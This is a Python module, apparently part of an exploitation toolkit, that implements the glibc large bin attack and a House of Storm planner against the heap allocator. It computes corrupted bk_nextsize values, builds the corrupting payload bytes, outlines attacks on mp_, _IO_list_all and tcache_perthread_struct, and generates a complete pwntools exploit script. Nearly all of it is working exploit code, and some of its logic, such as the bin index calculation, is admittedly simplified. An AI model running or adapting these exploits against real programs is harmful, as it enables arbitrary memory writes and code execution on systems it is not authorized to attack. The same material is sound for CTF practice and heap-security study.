"""
Large Bin Attack exploitation technique.

Exploits the large bin insertion mechanism to write a heap address
to an arbitrary location. Works on modern glibc (including 2.30+).

Requirements:
- Two large chunks (size > 0x400)
- UAF or heap overflow to corrupt large bin metadata
- Ability to trigger large bin insertion

References:
- https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c
- https://www.anquanke.com/post/id/189848 (House of Storm)
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class LargeBinChunk:
    """Represents a large bin chunk structure."""
    address: int
    size: int
    fd: int = 0
    bk: int = 0
    fd_nextsize: int = 0
    bk_nextsize: int = 0


class LargeBinAttack:
    """
    Large Bin Attack exploitation technique.

    When a chunk is inserted into a large bin and is smaller than an
    existing chunk, the following occurs:

        victim->fd_nextsize = fwd->fd_nextsize;
        victim->bk_nextsize = fwd;
        fwd->fd_nextsize = victim;
        victim->fd_nextsize->bk_nextsize = victim;  // WRITE!

    By corrupting fwd->bk_nextsize to (target - 0x20), we write
    a heap address (victim) to target.

    Modern glibc (2.30+) added checks but this attack still works
    with proper setup.
    """

    def __init__(self, bits: int = 64, libc_version: str = "2.31"):
        """
        Initialize Large Bin Attack exploiter.

        Args:
            bits: Architecture bits (32 or 64)
            libc_version: Target glibc version
        """
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.libc_version = libc_version

        # Chunk header size
        self.header_size = 16 if bits == 64 else 8
        self.ptr_size = 8 if bits == 64 else 4

        # Parse version
        self.major, self.minor = self._parse_version(libc_version)

        # Large bin minimum size (depends on arch)
        # 64-bit: 0x400 (smallbin max) to 0x1000+
        self.min_large_size = 0x420 if bits == 64 else 0x200

        # Offsets in chunk
        self.fd_offset = 0x10 if bits == 64 else 0x8
        self.bk_offset = 0x18 if bits == 64 else 0xc
        self.fd_nextsize_offset = 0x20 if bits == 64 else 0x10
        self.bk_nextsize_offset = 0x28 if bits == 64 else 0x14

    def _parse_version(self, version: str) -> Tuple[int, int]:
        """Parse glibc version string."""
        try:
            parts = version.split(".")
            return int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
        except (ValueError, IndexError):
            return 2, 31

    def check_feasibility(self) -> Dict[str, Any]:
        """
        Check if large bin attack is feasible.

        Returns:
            Feasibility analysis
        """
        result = {
            "feasible": True,
            "warnings": [],
            "requirements": [
                "Two large chunks with different sizes",
                "UAF or overflow to corrupt bk_nextsize",
                "Ability to trigger large bin insertion",
                f"Chunk sizes >= 0x{self.min_large_size:x}",
            ],
        }

        # Additional checks for glibc 2.30+
        if self.major >= 2 and self.minor >= 30:
            result["warnings"].append(
                "glibc 2.30+ requires more careful setup (fd_nextsize checks)"
            )

        return result

    def calculate_sizes(
        self,
        base_size: int = 0x420,
    ) -> Dict[str, int]:
        """
        Calculate optimal chunk sizes for large bin attack.

        We need two chunks where:
        - chunk1 is larger (goes to large bin first)
        - chunk2 is smaller (triggers the attack on insertion)

        Both must be in the same large bin index.

        Args:
            base_size: Base size for chunks

        Returns:
            Recommended sizes
        """
        # Large bins have ranges. We want both chunks in same bin.
        # First large bin: 0x400-0x430 (64-bit)

        chunk1_size = base_size + 0x20  # Slightly larger
        chunk2_size = base_size  # Smaller, will be inserted

        # Verify they're in same bin (simplified check)
        # Real implementation would use exact bin index calculation

        return {
            "chunk1_size": chunk1_size,  # First to large bin
            "chunk2_size": chunk2_size,  # Triggers attack
            "large_bin_idx": self._size_to_bin(chunk2_size),
        }

    def _size_to_bin(self, size: int) -> int:
        """
        Calculate large bin index from size.

        Large bins have varying ranges:
        - 0x400-0x430: bin 64
        - 0x440-0x470: bin 65
        - etc.

        Args:
            size: Chunk size

        Returns:
            Approximate bin index
        """
        if size < self.min_large_size:
            return -1  # Not a large bin size

        # Simplified calculation (actual is more complex)
        normalized = size - self.min_large_size
        return 64 + (normalized // 0x40)

    def calculate_bk_nextsize_value(self, target_addr: int) -> int:
        """
        Calculate value to write to bk_nextsize for arbitrary write.

        The write is:
            victim->fd_nextsize->bk_nextsize = victim

        Where fd_nextsize comes from fwd->fd_nextsize.
        We want: (fwd->bk_nextsize)->bk_nextsize = victim

        So bk_nextsize should point to: target - bk_nextsize_offset

        Args:
            target_addr: Address to write heap pointer

        Returns:
            Value for bk_nextsize corruption
        """
        return target_addr - self.bk_nextsize_offset

    def generate_exploit(
        self,
        target_addr: int,
        chunk1_size: int = 0x440,
        chunk2_size: int = 0x420,
    ) -> Dict[str, Any]:
        """
        Generate large bin attack exploit.

        Args:
            target_addr: Address to write heap pointer
            chunk1_size: Size of first (larger) chunk
            chunk2_size: Size of second (smaller) chunk

        Returns:
            Exploit details
        """
        bk_nextsize_value = self.calculate_bk_nextsize_value(target_addr)
        feasibility = self.check_feasibility()

        result = {
            "technique": "large_bin_attack",
            "target": target_addr,
            "written_value": "heap_pointer (victim chunk address)",
            "chunk1_size": chunk1_size,
            "chunk2_size": chunk2_size,
            "bk_nextsize_value": bk_nextsize_value,
            "feasibility": feasibility,
            "steps": [
                f"1. Allocate chunk1 (size 0x{chunk1_size:x}) - will be larger",
                f"2. Allocate chunk2 (size 0x{chunk2_size:x}) - will trigger attack",
                "3. Allocate guard chunks to prevent consolidation",
                "",
                "4. Free chunk1 -> goes to unsorted bin",
                "5. Allocate larger chunk -> moves chunk1 to large bin",
                "",
                "6. Free chunk2 -> goes to unsorted bin",
                f"7. Corrupt chunk1's bk_nextsize to 0x{bk_nextsize_value:x}",
                f"   (offset +0x{self.bk_nextsize_offset:x} in chunk1)",
                "",
                "8. Allocate to trigger large bin insertion of chunk2",
                f"9. Heap pointer written to 0x{target_addr:x}",
            ],
        }

        return result

    def generate_mp_attack(
        self,
        mp_addr: int,
        chunk1_size: int = 0x440,
        chunk2_size: int = 0x420,
    ) -> Dict[str, Any]:
        """
        Generate large bin attack to overwrite mp_ struct.

        The mp_ (malloc_par) struct controls malloc behavior.
        Overwriting mp_.tcache_bins can enable tcache on larger sizes.

        Args:
            mp_addr: Address of mp_ struct
            chunk1_size: Size of first chunk
            chunk2_size: Size of second chunk

        Returns:
            Exploit for mp_ overwrite
        """
        exploit = self.generate_exploit(
            target_addr=mp_addr,
            chunk1_size=chunk1_size,
            chunk2_size=chunk2_size,
        )

        exploit["use_case"] = "mp_struct"
        exploit["steps"].append(
            "10. mp_ struct corrupted with heap pointer"
        )
        exploit["steps"].append(
            "11. Can use to corrupt tcache_bins for further exploitation"
        )

        return exploit

    def generate_io_attack(
        self,
        io_list_all_addr: int,
        chunk1_size: int = 0x440,
        chunk2_size: int = 0x420,
    ) -> Dict[str, Any]:
        """
        Generate large bin attack for FSOP setup.

        Writes heap pointer to _IO_list_all, which can be used
        with a crafted fake FILE structure for code execution.

        Args:
            io_list_all_addr: Address of _IO_list_all
            chunk1_size: Size of first chunk
            chunk2_size: Size of second chunk

        Returns:
            Exploit for FSOP setup
        """
        exploit = self.generate_exploit(
            target_addr=io_list_all_addr,
            chunk1_size=chunk1_size,
            chunk2_size=chunk2_size,
        )

        exploit["use_case"] = "fsop"
        exploit["steps"].append(
            "10. _IO_list_all now points to heap (chunk2)"
        )
        exploit["steps"].append(
            "11. Craft fake FILE structure at chunk2"
        )
        exploit["steps"].append(
            "12. Trigger _IO_flush_all_lockp via exit/abort"
        )

        return exploit

    def generate_tcache_perthread_attack(
        self,
        tcache_perthread_addr: int,
        chunk1_size: int = 0x440,
        chunk2_size: int = 0x420,
    ) -> Dict[str, Any]:
        """
        Generate large bin attack on tcache_perthread_struct.

        Corrupts tcache metadata for further exploitation.

        Args:
            tcache_perthread_addr: Address of tcache_perthread_struct
            chunk1_size: Size of first chunk
            chunk2_size: Size of second chunk

        Returns:
            Exploit for tcache metadata corruption
        """
        exploit = self.generate_exploit(
            target_addr=tcache_perthread_addr,
            chunk1_size=chunk1_size,
            chunk2_size=chunk2_size,
        )

        exploit["use_case"] = "tcache_perthread"
        exploit["steps"].append(
            "10. tcache_perthread_struct corrupted with heap pointer"
        )
        exploit["steps"].append(
            "11. Can allocate from corrupted tcache entries"
        )

        return exploit

    def generate_payload(
        self,
        target_addr: int,
        fd_nextsize: int = 0,
    ) -> bytes:
        """
        Generate payload to corrupt large bin chunk.

        Layout at chunk+0x20:
            +0x20: fd_nextsize
            +0x28: bk_nextsize

        Args:
            target_addr: Target write address
            fd_nextsize: Value for fd_nextsize (usually keep original)

        Returns:
            Payload bytes (to write at fd_nextsize offset)
        """
        bk_nextsize_value = self.calculate_bk_nextsize_value(target_addr)

        payload = bytearray()
        payload += self.pack(fd_nextsize)  # fd_nextsize
        payload += self.pack(bk_nextsize_value)  # corrupted bk_nextsize

        return bytes(payload)

    def generate_pwntools_script(
        self,
        exploit: Dict[str, Any],
        alloc_func: str = "malloc",
        free_func: str = "free",
        edit_func: str = "edit",
    ) -> str:
        """
        Generate pwntools exploit script.

        Args:
            exploit: Exploit dict from generate_exploit
            alloc_func: Function to allocate
            free_func: Function to free
            edit_func: Function to edit chunk

        Returns:
            Python script string
        """
        script = f'''#!/usr/bin/env python3
"""
Large Bin Attack Exploit
Target: 0x{exploit['target']:x}
Written value: heap pointer (chunk address)
"""

from pwn import *

# Configuration
context.arch = "{'amd64' if self.bits == 64 else 'i386'}"
context.log_level = "debug"

# Addresses (update these)
TARGET = 0x{exploit['target']:x}
BK_NEXTSIZE_VALUE = 0x{exploit['bk_nextsize_value']:x}

# Sizes
CHUNK1_SIZE = 0x{exploit['chunk1_size']:x}  # Larger
CHUNK2_SIZE = 0x{exploit['chunk2_size']:x}  # Smaller (triggers attack)

def exploit():
    # Step 1-3: Allocate chunks
    chunk1 = {alloc_func}(CHUNK1_SIZE)
    guard1 = {alloc_func}(0x20)  # Prevent consolidation

    chunk2 = {alloc_func}(CHUNK2_SIZE)
    guard2 = {alloc_func}(0x20)

    log.info(f"chunk1 @ {{hex(chunk1)}}")
    log.info(f"chunk2 @ {{hex(chunk2)}}")

    # Step 4-5: Move chunk1 to large bin
    {free_func}(chunk1)
    # Allocate larger to trigger sorting
    trigger1 = {alloc_func}(CHUNK1_SIZE + 0x100)

    # Step 6: Free chunk2 to unsorted bin
    {free_func}(chunk2)

    # Step 7: Corrupt chunk1's bk_nextsize
    # bk_nextsize is at offset +0x{self.bk_nextsize_offset:x}
    payload = p64(0)  # fd_nextsize (keep or set appropriately)
    payload += p64(BK_NEXTSIZE_VALUE)  # corrupted bk_nextsize

    {edit_func}(chunk1, payload, offset=0x{self.fd_nextsize_offset:x})

    # Step 8: Trigger large bin insertion
    trigger2 = {alloc_func}(CHUNK2_SIZE + 0x100)

    log.success(f"Heap pointer written to {{hex(TARGET)}}")

if __name__ == "__main__":
    exploit()
'''
        return script

    def summary(self) -> str:
        """Get technique summary."""
        feasibility = self.check_feasibility()
        status = "✓ Feasible" if feasibility["feasible"] else "⚠ Limited"

        return f"""
Large Bin Attack
================
Architecture: {self.bits}-bit
glibc version: {self.libc_version}
Status: {status}

Requirements:
- Two large chunks (size >= 0x{self.min_large_size:x})
- UAF or overflow to corrupt bk_nextsize at offset +0x{self.bk_nextsize_offset:x}
- Ability to trigger large bin sorting

What it does:
- Writes a heap address to arbitrary location
- Useful for FSOP, tcache_perthread corruption, mp_ struct

Warnings:
{chr(10).join('- ' + w for w in feasibility['warnings']) or '- None'}
"""


class HouseOfStorm:
    """
    House of Storm technique combining unsorted bin and large bin attacks.

    Uses large bin attack + unsorted bin attack to achieve arbitrary
    chunk allocation without heap address leak.
    """

    def __init__(self, bits: int = 64, libc_version: str = "2.27"):
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.libc_version = libc_version
        self.header_size = 16 if bits == 64 else 8

        # Parse version
        parts = libc_version.split(".")
        self.major = int(parts[0]) if parts else 2
        self.minor = int(parts[1]) if len(parts) > 1 else 27

    def check_feasibility(self) -> Dict[str, Any]:
        """Check if House of Storm is feasible."""
        result = {
            "feasible": True,
            "warnings": [],
            "requirements": [
                "Large bin attack primitive",
                "Unsorted bin attack primitive",
                "Controlled allocation size",
            ],
        }

        # Patched in glibc 2.29+
        if self.major >= 2 and self.minor >= 29:
            result["feasible"] = False
            result["warnings"].append(
                f"House of Storm patched in glibc {self.libc_version}"
            )

        return result

    def generate_exploit(
        self,
        target_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate House of Storm exploit.

        Args:
            target_addr: Target allocation address

        Returns:
            Exploit details
        """
        feasibility = self.check_feasibility()

        result = {
            "technique": "house_of_storm",
            "target": target_addr,
            "feasibility": feasibility,
            "steps": [
                "1. Setup large bin chunk (chunk1)",
                "2. Setup unsorted bin chunk (chunk2)",
                "3. Corrupt chunk1->bk_nextsize for large bin attack",
                "4. Corrupt chunk2->bk for unsorted bin attack",
                "5. Create fake chunk header at target",
                "6. Trigger allocation -> returns target",
            ],
            "notes": [
                "Combines unsorted and large bin attacks",
                "Creates fake chunk at target via large bin write",
                "Unsorted bin attack returns the fake chunk",
            ],
        }

        return result


def large_bin_attack(
    target_addr: int,
    chunk1_size: int = 0x440,
    chunk2_size: int = 0x420,
    bits: int = 64,
    libc_version: str = "2.31",
) -> Dict[str, Any]:
    """
    Convenience function for large bin attack.

    Args:
        target_addr: Address to write heap pointer
        chunk1_size: Size of first (larger) chunk
        chunk2_size: Size of second (smaller) chunk
        bits: Architecture bits
        libc_version: Target glibc version

    Returns:
        Exploit details
    """
    lba = LargeBinAttack(bits=bits, libc_version=libc_version)
    return lba.generate_exploit(
        target_addr=target_addr,
        chunk1_size=chunk1_size,
        chunk2_size=chunk2_size,
    )
